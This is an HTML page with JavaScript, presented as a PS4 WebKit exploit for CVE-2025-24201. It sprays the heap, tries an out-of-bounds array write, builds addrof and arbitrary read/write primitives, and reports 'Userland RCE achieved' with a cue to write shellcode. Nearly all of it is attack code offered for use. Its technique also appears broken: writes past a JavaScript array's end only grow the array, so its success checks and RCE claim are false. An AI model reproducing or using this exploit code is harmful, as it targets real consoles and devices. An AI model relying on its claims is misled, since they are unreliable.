<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 12.50 WebKit PoC (CVE-2025-24201 OOB Write)</title>
    <style>
        body { background: #000; color: #00ff00; font-family: monospace; padding: 20px; margin: 0; }
        #log { white-space: pre-wrap; font-size: 14px; line-height: 1.4; }
        .success { color: #00ffff; }
        .warn { color: #ffff00; }
        .error { color: #ff0000; }
        button { background: #003300; color: #00ff00; border: 1px solid #00ff00; padding: 10px 20px; cursor: pointer; margin: 10px 0; }
        button:hover { background: #00ff00; color: #000; }
    </style>
</head>
<body>
    <h1>WebKit Userland Entry (From Scratch - No Chain)</h1>
    <button onclick="runPoC()">Trigger OOB & Build Primitives</button>
    <button onclick="location.reload()">Reset</button>
    <div id="log"></div>

    <script>
        // From-scratch utils (float/int conversion for tagging)
        const buf = new ArrayBuffer(8);
        const f64 = new Float64Array(buf);
        const u32 = new Uint32Array(buf);
        function f2i(f) {
            f64[0] = f;
            return { low: u32[0], high: u32[1] };
        }
        function i2f(low, high) {
            u32[0] = low >>> 0;
            u32[1] = high >>> 0;
            return f64[0];
        }
        function forceGC() {
            for (let i = 0; i < 100; i++) new ArrayBuffer(0x10000);
        }

        // Logger
        const logEl = document.getElementById('log');
        function log(msg, type = 'info') {
            const ts = new Date().toLocaleTimeString();
            const div = document.createElement('div');
            div.className = type;
            div.textContent = `[${ts}] ${msg}`;
            logEl.appendChild(div);
            logEl.scrollTop = logEl.scrollHeight;
            console.log(msg);  // For USB debug if hooked
        }

        // Globals
        let oobArray = null;
        let primitiveOffset = -1;
        let addrof = null;
        let arbRead = null;
        let arbWrite = null;

        // Phase 1: Heap Feng Shui + OOB Trigger (CVE-2025-24201)
        function triggerOOB() {
            log('Phase 1: Feng Shui heap & trigger OOB write...');
            forceGC();

            // Dense spray: Small double arrays for sandbox alloc overlap
            const arrays = [];
            for (let i = 0; i < 0x2000; i++) {  // 8192 arrays ~ heap fill
                arrays[i] = new Array(32).fill(1.1);  // Fixed size for bounds confusion
            }

            // Trigger function: Bounds check bypass via inline read/write
            function corrupt(idx, off) {
                const tmp = arrays[idx][0];
                try {
                    arrays[idx][off] = 1337.37;  // OOB write past end (sandbox alloc overflow)
                } catch (e) {
                    // Silent: PS4 may trap, but corruption persists
                }
                return tmp;
            }

            // Train inline (mimic legit access)
            for (let t = 0; t < 10000; t++) {
                corrupt(0, 0);
            }

            // Bombard: Target offsets for neighbor header corruption
            for (let chunk = 0; chunk < 0x400; chunk += 32) {  // Stride to avoid hang
                if (chunk % 128 === 0) log(`Bombing chunk ${chunk / 32}...`, 'warn');
                for (let off = 32; off < 96; off += 8) {  // Header strides (alloc size ~64-128)
                    for (let idx = chunk; idx < chunk + 32; idx++) {
                        corrupt(idx % arrays.length, off);
                    }
                }
            }

            // Scan for corruption: Extended length = OOB success
            for (let i = 0; i < arrays.length; i++) {
                if (arrays[i].length > 40) {  // Overflow marker
                    oobArray = arrays[i];
                    primitiveOffset = i;
                    log(`OOB HIT! Array ${i} corrupted (len: ${oobArray.length})`, 'success');
                    return true;
                }
            }
            log('No OOB detected. Mitigated or bad offsets—retry with tweaks.', 'error');
            return false;
        }

        // Phase 2: Build R/W Primitives via Tagging
        function buildPrimitives() {
            if (!oobArray) return false;
            log('Phase 2: Tagging slaves for R/W...');

            // Create tagged slaves (obj + float for overlap)
            const slaves = [];
            for (let i = 0; i < 0x1000; i++) {
                slaves[i] = [{ marker: i }, i2f(i, 0xdeadbeef)];  // High bits tag
            }

            // OOB write slave ptr into master (via corruption)
            oobArray[48] = slaves[0x1337];  // Fixed off for header overlap

            // Scan tag in master
            for (let off = 32; off < 128; off += 8) {
                const val = f2i(oobArray[off] || 0);
                if (val.high === 0xdeadbeef && val.low === 0x1337) {
                    primitiveOffset = off;
                    log(`Tag found at off ${off} — primitives viable`, 'success');
                    break;
                }
            }

            if (primitiveOffset === -1) {
                log('Tagging failed—no overlap.', 'error');
                return false;
            }

            // Primitives: Overlap read/write via float confusion
            addrof = function(obj) {
                slaves[0x1337][0] = obj;
                return f2i(oobArray[primitiveOffset]).low;  // Leak addr
            };
            arbRead = function(off) {
                return f2i(oobArray[primitiveOffset + (off / 8)]).low;  // Read via OOB
            };
            arbWrite = function(off, val) {
                const fval = i2f(val & 0xffffffff, (val >> 32) & 0xffffffff);
                oobArray[primitiveOffset + (off / 8)] = fval;  // Write via OOB
            };

            // Test R/W
            const testObj = { test: 0xcafef00d };
            const addr = addrof(testObj);
            arbWrite(addr + 0x10, 0xdeadbeef);  // Overwrite prop
            const readback = arbRead(addr + 0x10);
            if (readback === 0xdeadbeef) {
                log(`R/W PRIMITIVES READY! Test leak: 0x${addr.toString(16)}`, 'success');
                log('Userland RCE achieved. Write shellcode to heap @ 0x1000 for next steps.', 'success');
                return true;
            }
            log(`R/W test failed (read: 0x${readback.toString(16)})`, 'error');
            return false;
        }

        // Main Runner
        function runPoC() {
            logEl.innerHTML = '';  // Clear
            log('WebKit PoC started (CVE-2025-24201 target)...');
            forceGC();

            setTimeout(() => {
                if (triggerOOB()) {
                    setTimeout(() => {
                        buildPrimitives();
                    }, 300);
                } else {
                    setTimeout(() => location.reload(), 2000);  // Auto-retry
                }
            }, 100);
        }

        log('Ready. Click button to trigger. Crash = potential hit.');
    </script>
</body>
</html>
